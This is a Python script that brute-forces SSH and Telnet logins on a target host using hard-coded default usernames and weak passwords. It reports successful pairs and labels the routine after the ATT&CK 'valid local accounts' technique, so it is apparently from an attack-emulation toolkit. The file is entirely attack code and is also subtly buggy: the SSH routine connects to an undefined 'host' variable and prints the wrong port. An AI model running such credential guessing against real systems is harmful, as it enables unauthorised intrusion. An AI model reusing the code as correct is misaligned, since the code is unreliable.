import paramiko

import telnetlib
import socket


USER_LIST = ['root', 'admin', 'test', 'administrator', 'toor']
PASSWORD_LIST = ['123456', '123456789', 'password', '111111', '123123']

class ValidAccounts:

    def __init__(self, target, ssh, telnet):
        self.target = target
        self.ssh = ssh
        self.telnet = telnet

    def SSHLogin(self):
        for i in range(len(USER_LIST)):
            username = USER_LIST[i]
            for j in range(len(PASSWORD_LIST)):
                password = PASSWORD_LIST[j]
                try: 
                    ssh = paramiko.SSHClient()
                    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                    ssh.connect(host, port=self.ssh, username=username, password=password)
                    ssh_session = ssh.get_transport().open_session()
                    if ssh_session.active:
                        print(f'[+] SSH login successful on {self.target}:{self.telnet} {username} : {password}')
                        ssh.close()
                except:
                    print(f'[-] SSH login failed {username} {password}')

    def TelnetLogin(self):
        for i in range(len(USER_LIST)):
            username = USER_LIST[i]
            for j in range(len(PASSWORD_LIST)):
                password = PASSWORD_LIST[j]
                tn = telnetlib.Telnet(self.target, self.telnet, timeout=1)
                tn.read_until(b'login: ')
                tn.write((username + '\n').encode('utf-8'))
                tn.read_until(b'Password: ')
                tn.write((password + '\n').encode('utf-8'))

                try: 
                    result = tn.expect([b'Welcome'])
                    if (result[0] != -1):
                        print(f'[+] Telnet login successful on {self.target}:{self.telnet} {username} : {password}')
                        tn.close()
                except (EOFError, socket.timeout):
                    print(f'[-] Telnet login failed {username} {password}')

    def T1078_003(self):
        self.SSHLogin()
        self.TelnetLogin()

